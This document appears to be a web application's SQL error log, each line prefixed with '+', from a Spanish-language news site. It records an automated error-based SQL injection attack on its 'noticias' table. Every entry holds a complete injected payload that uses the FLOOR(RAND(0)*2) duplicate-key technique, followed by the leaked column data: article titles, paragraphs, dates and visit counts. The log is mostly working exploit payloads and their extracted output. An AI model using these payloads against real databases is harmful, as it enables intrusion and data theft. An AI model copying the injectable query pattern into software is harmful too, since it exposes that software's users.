+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2538 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(id AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 298,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqReitera Protección Civil recomendaciones por bajas temqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7142 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 297,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqor unanimidad de votos del Consejo.
+<p>
+De las persoqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5432 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),433,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq2016-01-19 21:28:37qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4730 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(`date` AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq
+El nuevo informe, realizado por la Misión de las Nacqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1972 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 496,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqnacionalqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1589 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(clasificacion AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 298,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1775 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(ciudad AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5226 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo5 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 297,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq 15 de enero del 2016.
+<p>
+El Acuerdo fue aprobado pqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1882 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),379,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq
+El Estado Islámico (EI) es responsable de actos de vqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5640 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 496,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq212qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5712 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(visitas AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 494,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3626 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(ciudad AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 298,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq2016-01-19 11:02:12qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 6717 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(`date` AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2923 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo4 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 297,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqberán estar instaladas a más tardar el próximo viernesqj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 8765 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),325,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7952 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen5 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 496,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq2016-01-09 11:27:36qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3774 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(`date` AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 298,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2720 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(videotype AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 494,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq285qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 6243 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(visitas AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 495,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3007 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo3 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 297,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3253 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen4 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 496,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqario o secretaria, de cada una de las asambleas que deqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 8002 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),271,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq207qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5785 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(visitas AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 295,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 6715 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(video AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 494,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 6572 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(videotype AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 495,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq
+Para evitar riesgos de daños físicos y materiales seqjz' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 6436 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 297,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq quedaron como presidente/presidenta, además de secretqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1520 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),217,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 6582 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen3 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 496,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9315 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(videotype AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 295,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqchihuahua3qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9991 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(ubicacion AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 494,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5969 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(video AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 495,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq
+
+La Coordinación de Protección Civil Municipal y elqjz' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1923 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 297,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:22
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1295 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(video AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 295,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:22
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqdo en el cual se dio a conocer la propuesta de quienesqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2663 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),163,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:22
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3113 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen2 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 496,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:22
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqEU le congela cuentas a “El Chapo”qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1240 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 494,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:22
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqchihuahua4qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7396 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(ubicacion AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 495,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:22
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4064 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen5 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 297,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:22
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqchihuahua2qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1871 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(ubicacion AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 295,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:22
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqejo Estatal del IEE, la votación del Proyecto de Acuerqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5453 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),109,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:22
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqisis.jpgqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2751 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 496,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:22
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5383 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo5 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 494,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:22
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqaqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3241 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),55,54) FROM delbd.noticias ORDER BY id LIMIT 495,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:22
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 8948 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen4 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 297,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:22
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqPor el frío, ausentismo llega al 20% en el estado  qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2523 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 295,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:22
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq3029qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1712 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(id AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 496,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:22
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqez sometió a consideración de los integrantes del Consqjz' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2416 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),55,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5748 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo4 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 494,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqDenuncian venta de falsos boletos para eventos del Papqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 6049 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 495,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7567 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen3 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 297,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3393 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo5 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 295,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqmundoqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9185 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(clasificacion AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 496,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqEl presidente del órgano electoral Arturo Meraz Gonzálqjz' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5871 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
